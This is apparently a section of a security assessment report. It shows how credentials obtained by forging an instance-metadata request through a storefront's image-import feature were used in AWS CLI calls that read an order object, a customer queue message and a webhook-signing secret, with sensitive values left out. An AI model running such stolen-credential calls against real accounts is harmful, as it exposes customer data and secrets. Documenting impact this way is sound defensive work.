# 2 — Instance Identity and Proven Reach

## Principal

The image-import fetch returned the instance metadata credential document. Calling STS with those credentials returned:

```json
{
  "UserId": "AROAXI4CLO5WCDXO762J4:i-0marlowe",
  "Account": "500100200300",
  "Arn": "arn:aws:sts::500100200300:assumed-role/marlowe-web-instance-role/i-0marlowe"
}
```

The principal is the assumed role `marlowe-web-instance-role`, with session `i-0marlowe`. This is the cloud identity obtained through the storefront; it is not a shell on the instance.

## Permission tests and account responses

| Call made with the role credentials | Response | Finding |
|---|---|---|
| `aws s3api get-object --bucket marlowe-orders-mc4e21 --key orders/2026-Q1.json /dev/null --query '{ETag:ETag,ContentLength:ContentLength}'` | Success; ETag `"074aacc1288e394e327be2402780c18c"`, content length `1868` | Can read the named order object. The body was sent to `/dev/null`. |
| `aws sqs receive-message --queue-url https://sqs.eu-west-1.amazonaws.com/500100200300/marlowe-customer-events --max-number-of-messages 1 --visibility-timeout 0 --query 'Messages[].MessageId'` | Success; returned message ID `b438c850-07d0-4c51-a93f-4e4d38dd0336` | Can receive a customer-events message. Visibility was reset immediately; body omitted. |
| `aws secretsmanager get-secret-value --secret-id marlowe/stripe-webhook-signing --query '{ARN:ARN,Name:Name,VersionId:VersionId}'` | Success; ARN `arn:aws:secretsmanager:eu-west-1:500100200300:secret:marlowe/stripe-webhook-signing-OZUeBE`, version `fccb4133-4ad9-413d-ad92-5083a55d0eaa` | Can retrieve the signing secret. The value is intentionally omitted. |
| `aws iam list-users` | `AccessDenied`: not authorized for `iam:ListUsers` | The role does not have this tested IAM enumeration permission. |

**Verdict:** a forged metadata request yields an instance identity with proven access to an order document, a customer queue message, and the webhook-signing secret. `iam:ListUsers` was tested and refused. These calls and responses, not the vulnerability label, establish the impact.
